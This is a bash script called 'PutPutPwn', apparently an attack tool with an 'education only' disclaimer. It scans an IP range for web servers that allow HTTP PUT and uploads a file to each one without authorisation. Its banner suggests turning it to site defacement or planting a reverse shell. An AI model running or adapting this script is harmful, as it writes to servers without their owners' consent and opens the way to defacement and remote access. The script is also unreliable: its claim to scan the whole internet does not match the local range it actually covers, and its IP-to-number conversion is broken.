#!/bin/bash
echo "
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░██████╗░██╗░░░██╗████████╗░░██████╗░██╗░░░██╗████████╗░░██████╗░░██╗░░░░░░░██╗███╗░░██╗░░
░░██╔══██╗██║░░░██║╚══██╔══╝░░██╔══██╗██║░░░██║╚══██╔══╝░░██╔══██╗░██║░░██╗░░██║████╗░██║░░
░░██████╔╝██║░░░██║░░░██║░░░░░██████╔╝██║░░░██║░░░██║░░░░░██████╔╝░╚██╗████╗██╔╝██╔██╗██║░░
░░██╔═══╝░██║░░░██║░░░██║░░░░░██╔═══╝░██║░░░██║░░░██║░░░░░██╔═══╝░░░████╔═████║░██║╚████║░░
░░██║░░░░░╚██████╔╝░░░██║░░░░░██║░░░░░╚██████╔╝░░░██║░░░░░██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║░░
░░╚═╝░░░░░░╚═════╝░░░░╚═╝░░░░░╚═╝░░░░░░╚═════╝░░░░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

DISCLAIMER: This tool was created to demonstrate the dangers of having the PUT method enabled. 
It is purely for education purposes and should not be used with malicious intent. 
Using this tool against targets that you don’t have permission to test is illegal. 

This tools uses curl to send an OPTIONS request to every IP address on the internet. 
It then uses grep to check if the response indicates that PUT methods are allowed. 
If the PUT method is allowed then the IP will be printed to the screen. 
The tool will then use CURL to send a PUT request that creates an text file on all IP's that support PUT. 

This could be modified to upload an index.html page that would result in the defacement of all IP’s that support PUT.
Furthermore, it could be used to create a file that when called could send a reverse shell back to an IP specified in the created file. 
"

# Define the range of IP addresses to check
start_ip="192.168.1.1"
end_ip="192.168.1.254"

# Convert the start and end IP addresses to numeric values
start=$(printf '%d' $(echo $start_ip | tr '.' ' '))
end=$(printf '%d' $(echo $end_ip | tr '.' ' '))

# Loop through the IP addresses
for ((ip=$start; ip<=$end; ip++)); do
  # Convert the numeric IP address back to dotted notation
  ip_address=$(printf '%d.%d.%d.%d' $(($ip>>24&255)) $(($ip>>16&255)) $(($ip>>8&255)) $(($ip&255)))
  echo "Checking $ip_address..."

  # Check if the PUT method is allowed on the server
  response=$(curl -s -I -X OPTIONS "http://${ip_address}" --connect-timeout 10 | grep -i "Allow:.*PUT")
  if [ -n "$response" ]; then
    echo "PUT is allowed on ${ip_address}"
    # Send a PUT request to upload a file
    curl -X PUT -d "this server supports put" "http://${ip_address}/putputpwn.txt"
    # Check if the file was uploaded successfully
    if curl --head --silent --fail "http://${ip_address}/putputpwn.txt" >/dev/null; then
      echo "putputpwn.txt uploaded successfully to ${ip_address}"
    else
      echo "putputpwn.txt upload failed for ${ip_address}"
    fi
  fi
done
